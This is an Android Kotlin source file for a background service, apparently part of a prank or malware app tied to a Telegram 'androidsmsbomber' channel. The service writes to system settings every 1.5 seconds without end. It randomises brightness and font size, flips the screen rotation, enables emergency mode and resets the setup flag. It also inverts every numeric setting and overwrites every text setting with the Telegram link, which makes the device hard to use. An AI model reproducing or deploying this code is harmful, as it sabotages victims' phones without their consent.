package com.wavecat.cupcake

import android.app.Service
import android.content.ContentValues
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlin.random.Random

class MainService : Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        CoroutineScope(Dispatchers.Default).launch {
            val iterables = defaults.mapValues {
                it.value.iterator()
            }

            for ((k, v) in iterables) {
                val values = ContentValues(2)
                values.put("name", k)
                values.put("value", v.next())
                contentResolver.insert(settings, values)
            }

            while (true) {
                delay(1500)

                val cursor = contentResolver.query(
                    settings,
                    arrayOf("_id", "name", "value"),
                    null,
                    null,
                    null
                ) ?: return@launch

                cursor.moveToFirst()
                while (cursor.moveToNext()) {
                    val name = cursor.getString(1)
                    val value = cursor.getString(2) ?: continue

                    try {
                        val values = ContentValues(2)
                        values.put("name", name)
                        values.put(
                            "value", if (iterables.containsKey(name))
                                iterables[name]?.next()
                            else
                                try {
                                    val number = value.toInt()
                                    when (number) {
                                        0 -> 1
                                        1 -> 0
                                        else -> if (number > 1) Random.nextInt(2, number)
                                        else Random.nextInt(2, 10)
                                    }.toString()
                                } catch (e: java.lang.NumberFormatException) {
                                    DEFAULT_STRING
                                }
                        )

                        contentResolver.insert(settings, values)

                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }

                cursor.close()
            }
        }

        return super.onStartCommand(intent, flags, startId)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    companion object {
        val settings = Uri.parse("content://settings/system")!!

        const val DEFAULT_STRING = "https://t.me/androidsmsbomber"

        val defaults = mutableMapOf(
            "screen_brightness" to sequence {
                while (true)
                    yield(Random.nextInt(30).toString())
            },

            "screen_off_timeout" to generateSequence { "0" },

            "blue_light_filter" to generateSequence { "1" },

            "font_scale" to sequence {
                while (true)
                    yield(Random.nextInt(4, 6).toString())
            },

            "show_touches" to generateSequence { "1" },

            "time_12_24" to generateSequence { "12" },

            "user_rotation" to sequence {
                while (true) {
                    yield("0")
                    yield("1")
                }
            },

            "setup_wizard_has_run" to generateSequence { "0" },

            "emergency_mode" to generateSequence { "1" },

            "reduce_animations" to generateSequence { "1" },

            "remove_animations" to generateSequence { "1" },
        )
    }
}